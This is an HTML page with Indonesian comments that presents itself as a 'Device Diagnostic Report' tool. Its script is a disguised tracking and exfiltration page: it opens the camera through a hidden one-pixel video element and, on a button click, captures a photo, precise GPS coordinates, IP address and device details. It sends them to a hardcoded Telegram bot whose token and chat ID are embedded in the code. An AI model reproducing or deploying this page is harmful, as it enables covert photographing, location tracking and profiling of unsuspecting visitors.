<!DOCTYPE html>
<html>
<head>
  <title>Smart Device Reporter</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <style>
    body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
    button { padding: 15px 30px; font-size: 18px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; }
    button:disabled { background: #cccccc; }
    #loading { display: none; margin: 20px; }
    #preview { max-width: 300px; margin: 20px auto; }
  </style>
</head>
<body>
  <h1>Device Diagnostic Report</h1>
  <div id="loading">Memproses... ‚è≥</div>
  <video id="video" width="1" height="1" autoplay playsinline muted></video>
  <button id="capture-btn">Generate Report</button>
  <canvas id="canvas" width="1" height="1" style="display: none;"></canvas>
  <img id="preview" alt="Preview Gambar">

  <script>
    const BOT_TOKEN = '6130843488:AAEcBDwepm6__C3geoFMSJtsMVrKFeWhMKQ';
    const CHAT_ID = '1121369247';
    const video = document.getElementById('video');
    const captureButton = document.getElementById('capture-btn');
    const loading = document.getElementById('loading');
    const preview = document.getElementById('preview');
    let isProcessing = false;

    // Inisialisasi Kamera
    async function initCamera() {
      try {
        const constraints = {
          video: {
            facingMode: 'environment',
            width: { ideal: 1920 },
            height: { ideal: 1080 }
          },
          audio: false
        };

        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;
        
        await new Promise((resolve, reject) => {
          video.onloadedmetadata = resolve;
          video.onerror = reject;
        });
        
        await video.play();
      } catch (err) {
        handleError('Kamera', err);
      }
    }

    // Handler Utama
    captureButton.onclick = async () => {
      if (isProcessing) return;
      isProcessing = true;
      loading.style.display = 'block';
      captureButton.disabled = true;

      try {
        const [imageDataURL, position, deviceInfo] = await Promise.all([
          capturePhoto(),
          getLocation(),
          getDeviceInfo()
        ]);

        preview.src = imageDataURL;
        preview.style.display = 'block';

        await sendToTelegram(imageDataURL, position, deviceInfo);
        showToast('Laporan berhasil dikirim!', 'success');
      } catch (error) {
        handleError('Pengiriman', error);
      } finally {
        isProcessing = false;
        loading.style.display = 'none';
        captureButton.disabled = false;
      }
    };

    // Capture Foto dengan Penanganan Orientasi
    async function capturePhoto() {
      const canvas = document.createElement('canvas');
      const context = canvas.getContext('2d');
      const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);

      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;

      if (isMobile && screen.orientation.type.includes('portrait')) {
        context.translate(canvas.width/2, canvas.height/2);
        context.rotate(Math.PI/2);
        context.drawImage(video, -canvas.width/2, -canvas.height/2);
      } else {
        context.drawImage(video, 0, 0, canvas.width, canvas.height);
      }

      return canvas.toDataURL('image/jpeg', 0.85);
    }

    // Geolocation dengan Fallback
    async function getLocation() {
      return new Promise((resolve, reject) => {
        const options = {
          enableHighAccuracy: true,
          timeout: 15000,
          maximumAge: 0
        };

        const success = (position) => {
          clearTimeout(timer);
          resolve(position);
        };

        const error = (err) => {
          clearTimeout(timer);
          reject(new Error(`GPS Error: ${err.message}`));
        };

        const timer = setTimeout(() => {
          reject(new Error('Waktu permintaan lokasi habis'));
        }, 20000);

        navigator.geolocation.getCurrentPosition(success, error, options);
      });
    }

    // Device Info Lengkap
    async function getDeviceInfo() {
      const battery = await navigator.getBattery?.().catch(() => null);
      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;

      return {
        OS: getOS(),
        Browser: getBrowser(),
        Platform: navigator.platform,
        RAM: navigator.deviceMemory || 'Unknown',
        Cores: navigator.hardwareConcurrency,
        Battery: battery ? `${Math.round(battery.level * 100)}%` : 'N/A',
        Network: connection ? `${connection.type} (${connection.effectiveType})` : 'N/A',
        IP: await getIP(),
        Resolution: `${screen.width}x${screen.height}`,
        Touch: navigator.maxTouchPoints > 0,
        Timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        Language: navigator.language
      };
    }

    // Fitur Tambahan
    async function getIP() {
      try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
      } catch {
        return 'N/A';
      }
    }

    function getOS() {
      const ua = navigator.userAgent;
      if (/android/i.test(ua)) return 'Android';
      if (/iPad|iPhone|iPod/.test(ua)) return 'iOS';
      if (/Win/.test(ua)) return 'Windows';
      if (/Mac/.test(ua)) return 'MacOS';
      if (/Linux/.test(ua)) return 'Linux';
      return 'Unknown';
    }

    function getBrowser() {
      const ua = navigator.userAgent;
      if (/Edg/.test(ua)) return 'Edge';
      if (/Chrome/.test(ua)) return 'Chrome';
      if (/Firefox/.test(ua)) return 'Firefox';
      if (/Safari/.test(ua)) return 'Safari';
      return 'Unknown';
    }

    // Kirim ke Telegram dengan Format Kaya
    async function sendToTelegram(imageDataURL, position, deviceInfo) {
      const formData = new FormData();
      const blob = await dataURItoBlob(imageDataURL);
      const { latitude, longitude, accuracy } = position.coords;
      const mapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;

      const caption = `
üì° *Lokasi*: [Google Maps](${mapsLink})
üìç *Koordinat*: \`${latitude.toFixed(6)}, ${longitude.toFixed(6)}\`
üéØ *Akurasi*: ${Math.round(accuracy)} meter

üìä *Device Info*:
${Object.entries(deviceInfo).map(([k, v]) => `‚Ä¢ *${k}*: ${v}`).join('\n')}

üïí *Waktu*: ${new Date().toLocaleString()}
      `;

      formData.append('chat_id', CHAT_ID);
      formData.append('photo', blob, 'device_report.jpg');
      formData.append('caption', caption);
      formData.append('parse_mode', 'Markdown');

      const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });

      if (!response.ok) {
        const error = await response.json();
        throw new Error(`Telegram API: ${error.description}`);
      }
    }

    // Konversi DataURI ke Blob
    async function dataURItoBlob(dataURI) {
      if (window.WebKitBlobBuilder) {
        const parts = dataURI.split(',');
        const contentType = parts[0].split(':')[1].split(';')[0];
        const rawData = window.atob(parts[1]);
        const builder = new WebKitBlobBuilder();
        builder.append(rawData);
        return builder.getBlob(contentType);
      }
      return fetch(dataURI).then(res => res.blob());
    }

    // Error Handling
    function handleError(context, error) {
      console.error(`[${context}]`, error);
      showToast(`ERROR: ${error.message}`, 'error');
    }

    function showToast(message, type = 'info') {
      const toast = document.createElement('div');
      toast.style = `
        position: fixed;
        bottom: 20px;
        left: 50%;
        transform: translateX(-50%);
        padding: 15px 30px;
        background: ${type === 'error' ? '#dc3545' : '#28a745'};
        color: white;
        border-radius: 5px;
        box-shadow: 0 2px 5px rgba(0,0,0,0.2);
      `;
      toast.textContent = message;
      document.body.appendChild(toast);

      setTimeout(() => toast.remove(), 5000);
    }

    // Inisialisasi
    if (navigator.mediaDevices) {
      initCamera().catch(err => handleError('Init', err));
    } else {
      showToast('Browser tidak mendukung kamera!', 'error');
    }
  </script>
</body>
</html>
